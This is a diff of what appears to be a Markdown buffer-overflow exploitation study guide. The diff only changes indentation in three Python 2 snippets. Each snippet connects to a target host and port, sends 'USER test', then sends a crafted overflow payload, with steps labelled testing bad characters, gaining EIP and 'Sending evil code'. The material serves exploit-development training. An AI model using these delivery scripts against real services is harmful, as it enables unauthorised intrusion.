@@ -194,17 +194,17 @@ payload += "D"*(size-len(payload))
 payload += "\r\n"
 
 try:
-    print "Testing bad chars..."
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((rhost,rport))
-    s.recv(1024)
-    s.send("USER test\r\n")
-    s.recv(1024)
-    s.send(payload)
-    s.close()
+	print "Testing bad chars..."
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((rhost,rport))
+	s.recv(1024)
+	s.send("USER test\r\n")
+	s.recv(1024)
+	s.send(payload)
+	s.close()
 except:
-		print "Oops! Something went wrong!"
-    sys.exit()
+	print "Oops! Something went wrong!"
+	sys.exit()
 ```
 
 ### Finding JMP Pointer
@@ -245,17 +245,17 @@ payload += "C"*(size-len(buff))
 payload += "\r\n"
 
 try:
-    print "Gaining EIP..."
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((rhost,rport))
-    s.recv(1024)
-    s.send("USER test\r\n")
-    s.recv(1024)
-    s.send(payload)
-    s.close()
+	print "Gaining EIP..."
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((rhost,rport))
+	s.recv(1024)
+	s.send("USER test\r\n")
+	s.recv(1024)
+	s.send(payload)
+	s.close()
 except:
-		print "Oops! Something went wrong!"
-    sys.exit()
+	print "Oops! Something went wrong!"
+	sys.exit()
 ```
 
 Once we hit the breakpoint, first test is complete. Now let the application continue execution till return to ensure it actually goes in to the ESP.
@@ -297,17 +297,17 @@ payload += "D"*(size - len(payload))
 payload += "\r\n"
 
 try:
-    print "Sending evil code..."
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((rhost,rport))
-    s.recv(1024)
-    s.send("USER test\r\n")
-    s.recv(1024)
-    s.send(payload)
-    s.close()
+	print "Sending evil code..."
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((rhost,rport))
+	s.recv(1024)
+	s.send("USER test\r\n")
+	s.recv(1024)
+	s.send(payload)
+	s.close()
 except:
-		print "Oops! Something went wrong!"
-    sys.exit()
+	print "Oops! Something went wrong!"
+	sys.exit()
 ```
 
 ## EXAM GUIDE
